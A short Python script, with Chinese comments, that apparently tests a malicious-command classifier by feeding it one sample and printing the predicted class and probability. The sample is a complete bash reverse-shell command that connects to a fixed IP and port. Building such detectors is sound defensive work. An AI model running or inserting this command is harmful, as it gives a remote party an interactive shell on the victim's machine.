from malicious_model import predict, model, tokenizer

# 待预测的文本
text_to_predict = "sh -i >& /dev/tcp/192.168.59.136/3333 0>&1"

# 调用predict函数得到预测结果

predicted_class_idx, max_probability = predict(text_to_predict, model, tokenizer)

print(f"The predicted class index is: {predicted_class_idx}")
print(f"The maximum probability is: {max_probability:.4f}")
